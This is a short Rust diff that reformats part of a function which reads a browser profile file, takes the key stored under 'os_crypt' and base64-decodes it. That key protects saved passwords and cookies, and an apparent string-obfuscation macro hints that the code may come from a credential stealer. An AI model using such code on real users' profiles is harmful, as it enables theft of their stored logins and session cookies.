@@ -408,10 +408,7 @@ fn extract_key(user_data: &Path, key: &str) -> Option<Vec<u8>> {
 
     let parsed = parse(&bytes).ok()?;
 
-    let key_in_base64 = parsed.get(s!("os_crypt"))
-        ?.get(key)
-        ?.as_string()
-        ?.clone();
+    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(key)?.as_string()?.clone();
 
     let key = base64_decode_string(&key_in_base64)?;
     Some(key)
